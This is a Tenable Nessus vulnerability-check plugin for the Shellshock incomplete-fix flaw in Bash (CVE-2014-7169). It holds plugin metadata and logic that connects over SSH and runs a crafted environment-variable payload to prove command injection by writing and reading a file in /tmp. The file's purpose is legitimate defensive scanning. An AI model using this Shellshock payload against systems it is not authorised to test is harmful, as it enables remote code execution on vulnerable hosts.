#TRUSTED 2f9886caf1e20135182df82d1b5a31d466379a741f9989af901138d6bc4c1e8971e9309fce299db68f958d74726a4cc38e0e8709890b37dde0919fa52cb178d83034781aee324a948b54339bb4fae09c8ff201006f8848f540faed3b43976014f26a839a35c4b8bdf262d468c6a9e74128388e1a98a77ac8bb92df74982d80231a17dbefb0aba8e8338baaccf8af46f194efe44dbd1193a9804539f3347449838803c49e8f02e3dfe4e2334bf822f3aaac80b6d427f356db0c79909db6c7364d6d7d428662c83cbd68ff199d28416260d9b8759175086997dac81c899759e4fc32e52efc896911a3d4ac9378e444c92028e0ea30125ea99358d00ffff89ca0be915fa97c8299e2b3f5d8cd7fe33f5926ca8431245035b3de03b8964366333adc8993ef9d46b39c7ae0bd72356011679e776eb996e4c81bc858bd655b46de1c7517a47d0fc59491ce4de4cf2a0905352b4921bbe904048100086b4ed015575d1314620dd727458bd94959e2f455338628ee968350d1e190398582bf763467da6d0e987a300dd2214c8a8f47ad3ab558f95f03dcae8363bf1279148d9b101247512e9bad337f7219ff8b81b14b8ce29a6407640f6fcdfe0bfdaebd44d812af1141406ccc3b3cf52dd92d8b4b54b4f4eeb45974fd63a01b5df36233e199e4053ec9f7deed3abaf26502a514237122c98f62520bd0e506a07017bf805d9881f81cb3
#TRUST-RSA-SHA256 202736ec1fae9ab6b777dc308acf4c2a3cc99b3d69b73a3abc3124f4f111afd466555b11d79e75e9dce9094a6fc31afa6d2d2fb2eebc33fc0239010250a9ac3ab7671c5128583ec14a48872c1af4552bd33ed11ca3da26296baea89e1fd93c3e362cd8932f4dcea9957d793a7329dcc1b79f1b94639404fe4805a55eb94c33c23d01e3311e33d72f29c74d9fd4a6be96cb0e38812e7d779125159a3e94e65a7313a748c9d9e5979a089beba56ff3810573aca6e5537db7c39a65962e40a85cd82b35538de29aaa763891c9634e2c97d6efb14e9743c9ed98bea33039bb173d90c1e01e8f2d702688ba1fbe3d9ed0fc88696c5a8fcd02f8294c325306f1631a02fb7679b408add9cdf61f7c786c51c0519cff0597b7d55010907655505d6cf93610188dc4875afc6dd5ae66bacaa434d1f28aa0c33d3a763025271470de1337e042cd5186cbd726f8db586af1c730d2154defd96f8794e3065cb87ece829f8c9807cd3d514864f94e029e8a23fa6fcf940a26f3bfa6a6072467437b7b554d38c58197a23537fb2b220bf5816c395838f68818c61ca952e1a44283bde3429a58562452fdc6550161eb2823e81b0911755d9465c56faffb4df907e54d0298239c7ab7a75c3181666f7df792dcbd28306e987fd5d080dc360e47ce84859bac849a1216a5e7f3e0c51a76681802091fac6b3882fd4dcffec5b68f49fd1d56e27e76cc
#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(78385);
  script_version("1.22");
  script_set_attribute(attribute:"plugin_modification_date", value:"2023/04/25");

  script_cve_id("CVE-2014-7169");
  script_bugtraq_id(70137);
  script_xref(name:"CERT", value:"252743");
  script_xref(name:"IAVA", value:"2014-A-0142");
  script_xref(name:"EDB-ID", value:"34765");
  script_xref(name:"EDB-ID", value:"34766");
  script_xref(name:"EDB-ID", value:"34777");
  script_xref(name:"CISA-KNOWN-EXPLOITED", value:"2022/07/28");

  script_name(english:"Bash Incomplete Fix Remote Code Execution Vulnerability (Shellshock)");

  script_set_attribute(attribute:"synopsis", value:
"A system shell on the remote host is vulnerable to command injection.");
  script_set_attribute(attribute:"description", value:
"The remote host is running a version of Bash that is vulnerable to
command injection via environment variable manipulation. Depending on
the configuration of the system, an attacker can remotely execute
arbitrary code.");
  # https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dacf7829");
  script_set_attribute(attribute:"solution", value:
"Apply the appropriate updates.");
  script_set_attribute(attribute:"agent", value:"unix");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2014-7169");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Pure-FTPd External Authentication Bash Environment Variable Code Injection');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/09/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/09/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/10/13");

  script_set_attribute(attribute:"plugin_type", value:"local");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:gnu:bash");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2014-2023 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("ssh_get_info.nasl");
  script_require_keys("HostLevelChecks/proto");
  script_require_ports("Services/ssh", 22);

  exit(0);
}

include('ssh_func.inc');
include('telnet_func.inc');
include('hostlevel_funcs.inc');
include('data_protection.inc');

if(sshlib::get_support_level() >= sshlib::SSH_LIB_SUPPORTS_COMMANDS ||
    get_one_kb_item('HostLevelChecks/proto') == 'local')
  enable_ssh_wrappers();
else disable_ssh_wrappers();

var proto = get_kb_item_or_exit('HostLevelChecks/proto');

var port = get_service(svc:"ssh", default:22, exit_on_fail:TRUE);
if (!get_port_state(port)) audit(AUDIT_PORT_CLOSED, port);

var info_t;

if (proto == 'local')
  info_t = INFO_LOCAL;
else if (proto == 'ssh')
{
  info_t = INFO_SSH;
  var ret = ssh_open_connection();
  if (!ret) audit(AUDIT_FN_FAIL, 'ssh_open_connection');
}
else
  exit(0, 'This plugin only attempts to run commands locally or via SSH, and neither is available against the remote host.');

  var AIX_Check = get_kb_item("Host/AIX/version");
  if (!isnull(AIX_Check) && AIX_Check =~ '^AIX-[0-5].')
  {
    if(info_t == INFO_SSH) ssh_close_connection();
    exit(0, "Commands are not supported on AIX 5.1 and below");
  }
else
  var command = "cd /tmp && X='() { (a)=>\' bash -c 'echo /usr/bin/id' && cat /tmp/echo && rm /tmp/echo";
  var output = info_send_cmd(cmd:command);

  if(info_t == INFO_SSH) ssh_close_connection();
  if (output !~ "uid=[0-9]+.*gid=[0-9]+.*") audit(AUDIT_HOST_NOT, "affected.");

var report =
  '\n' + 'Nessus was able to exploit a flaw in the patch for CVE-2014-7169' +
  '\n' + 'and write to a file on the target system.' +
  '\n' +
  '\n' + 'File contents :' +
  '\n' +
  '\n' + data_protection::sanitize_uid(output:output) +
  '\n' +
  '\n' + 'Note: Nessus has attempted to remove the file from the /tmp directory.\n';
security_report_v4(port:port,extra:report,severity:SECURITY_HOLE);

